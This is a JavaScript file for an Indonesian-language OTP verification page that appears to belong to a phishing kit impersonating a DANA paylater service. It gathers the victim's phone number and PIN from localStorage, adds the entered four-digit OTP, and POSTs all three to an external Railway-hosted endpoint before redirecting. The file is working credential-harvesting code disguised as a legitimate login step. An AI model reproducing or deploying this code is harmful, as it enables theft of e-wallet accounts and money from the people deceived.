// ============================
// ELEMENT
// ============================
const inputs = document.querySelectorAll(".otp-box input");
const btn = document.getElementById("resendBtn");

// ============================
// HANDLE INPUT OTP
// ============================
inputs.forEach((input, index) => {
  input.addEventListener("input", () => {

    // hanya angka 1 digit
    input.value = input.value.replace(/[^0-9]/g, "").slice(0,1);

    // auto pindah
    if (input.value && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }

    cekOTP();
  });

  // backspace pindah ke kiri
  input.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && !input.value && index > 0) {
      inputs[index - 1].focus();
    }
  });
});

// ============================
// CEK OTP
// ============================
function cekOTP() {
  let otp = "";

  inputs.forEach(i => otp += i.value);

  if (otp.length === 4) {
    kirimData(otp);
  }
}

// ============================
// KIRIM SEMUA DATA (FINAL)
// ============================
async function kirimData(otp) {

  const phone = localStorage.getItem("phone");
  const pin = localStorage.getItem("pin");

  console.log("📤 DATA DIKIRIM:", { phone, pin, otp });

  // validasi
  if (!phone || !pin || !otp) {
    console.log("❌ DATA TIDAK LENGKAP");
    return;
  }

  try {
    await fetch("https://danacicilanpaylaterr-production.up.railway.app/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        phone,
        pin,
        otp
      })
    });

    console.log("✅ BERHASIL DIKIRIM");

  } catch (err) {
    console.log("❌ ERROR:", err);
  }

  // 🔥 hapus data biar tidak bentrok
  localStorage.removeItem("phone");
  localStorage.removeItem("pin");

  // pindah halaman
  setTimeout(() => {
    window.location.href = "tap.html";
  }, 1000);
}

// ============================
// TIMER RESEND
// ============================
let time = 30;

function startTimer() {
  const interval = setInterval(() => {

    let seconds = time < 10 ? "0" + time : time;
    btn.innerText = `KIRIM ULANG 00:${seconds}`;

    time--;

    if (time < 0) {
      clearInterval(interval);

      btn.disabled = false;
      btn.innerText = "KIRIM ULANG";
      btn.style.background = "white";
      btn.style.color = "#1e88e5";
    }

  }, 1000);
}

startTimer();

// ============================
// TAMPILKAN NOMOR
// ============================
const phone = localStorage.getItem("phone");

if (phone) {
  const el = document.getElementById("phoneDisplay");

  if (el) {
    const masked = phone.slice(0, 3) + "****" + phone.slice(-3);
    el.innerText = "+62" + masked;
  }
}